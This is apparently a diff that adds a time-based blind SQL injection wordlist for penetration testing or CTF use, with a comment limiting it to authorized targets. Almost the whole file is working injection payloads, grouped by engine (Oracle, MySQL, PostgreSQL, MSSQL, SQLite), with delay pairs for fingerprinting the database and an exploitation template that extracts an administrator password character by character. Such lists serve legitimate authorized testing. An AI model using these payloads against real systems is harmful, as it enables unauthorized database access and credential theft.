@@ -1,0 +1,57 @@
+# =====================================================
+# TIME-BASED BLIND SQLi CONFIRMATION WORDLIST
+# Context: string literal, single-quote breakout, '||...||' concat works
+# Strategy: each engine has a TRUE (delay) / FALSE (no delay) pair.
+#   The engine whose TRUE row delays ~5s = the live DBMS.
+#   The matching FALSE row must NOT delay = proves it's conditional, not constant.
+# Delay target: 5000ms. Compare Time(ms) TRUE vs FALSE for each engine.
+# Authorized testing only: own labs, CTFs, in-scope bug bounty assets.
+# =====================================================
+
+## 0. BASELINE (should NOT delay — anchors normal response time)
+'||(SELECT '')||'
+
+## 1. ORACLE  (primary suspect: dual / v$version / ROWNUM seen)
+# heavy-query delay (works without special privs)
+'||(SELECT CASE WHEN (1=1) THEN (SELECT count(*) FROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=2) THEN (SELECT count(*) FROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) ELSE '' END FROM dual)||'
+# dbms_pipe.receive_message (clean 5s, often available)
+'||(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=2) THEN dbms_pipe.receive_message('a',5) ELSE '' END FROM dual)||'
+
+## 2. MYSQL / MariaDB
+'||(SELECT SLEEP(5))||'
+'+(SELECT SLEEP(5))+'
+' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -
+' AND IF(1=1,SLEEP(5),0)-- -
+' AND IF(1=2,SLEEP(5),0)-- -
+'||(SELECT IF(1=1,SLEEP(5),0))||'
+'||(SELECT IF(1=2,SLEEP(5),0))||'
+
+## 3. POSTGRESQL
+'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)||'
+'||(SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END)||'
+' AND (SELECT 1 FROM pg_sleep(5))IS NOT NULL-- -
+'; SELECT pg_sleep(5)-- -
+
+## 4. MSSQL (SQL Server)
+'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
+'; IF (1=2) WAITFOR DELAY '0:0:5'-- -
+' WAITFOR DELAY '0:0:5'-- -
+'+(SELECT CASE WHEN (1=1) THEN '' ELSE '' END)+'; WAITFOR DELAY '0:0:5'-- -
+
+## 5. SQLITE  (no native sleep; use heavy randomblob to force CPU delay)
+'||(SELECT CASE WHEN (1=1) THEN (SELECT count(*) FROM (SELECT 1 UNION SELECT 2),(SELECT 1 UNION SELECT 2)) AND randomblob(100000000) ELSE '' END)||'
+'||(SELECT CASE WHEN (1=1) THEN hex(randomblob(100000000)) ELSE '' END)||'
+'||(SELECT CASE WHEN (1=2) THEN hex(randomblob(100000000)) ELSE '' END)||'
+
+## 6. EXPLOITATION TEMPLATE — once engine identified, swap {COND} for a real test
+#    e.g. {COND} = (SELECT substr(password,1,1) FROM users WHERE username='administrator')='a'
+#    Oracle:
+'||(SELECT CASE WHEN ({COND}) THEN dbms_pipe.receive_message('a',5) ELSE '' END FROM dual)||'
+#    MySQL:
+' AND IF(({COND}),SLEEP(5),0)-- -
+#    Postgres:
+'||(SELECT CASE WHEN ({COND}) THEN pg_sleep(5) ELSE pg_sleep(0) END)||'
+#    MSSQL:
+'; IF ({COND}) WAITFOR DELAY '0:0:5'-- -
